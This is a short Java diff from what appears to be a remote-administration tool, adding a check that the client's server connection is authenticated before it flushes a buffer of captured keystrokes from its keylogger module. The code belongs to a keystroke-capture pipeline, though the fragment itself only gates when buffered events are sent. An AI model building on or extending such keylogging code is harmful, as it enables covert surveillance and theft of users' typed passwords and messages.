@@ -21,6 +21,7 @@ import java.util.ArrayList;
 
 import com.subterranean_security.crimson.client.ClientStore;
 import com.subterranean_security.crimson.client.modules.Keylogger;
+import com.subterranean_security.crimson.core.net.ConnectionState;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
 
@@ -32,6 +33,9 @@ public enum ClientCommands {
 	}
 
 	public static void flushKeybuffer() {
+		if (ClientStore.Connections.getServerConnectionState() != ConnectionState.AUTHENTICATED) {
+			return;
+		}
 		ArrayList<EV_KEvent> buffer = Keylogger.buffer;
 		synchronized (Keylogger.buffer) {
 			Keylogger.buffer = new ArrayList<EV_KEvent>();
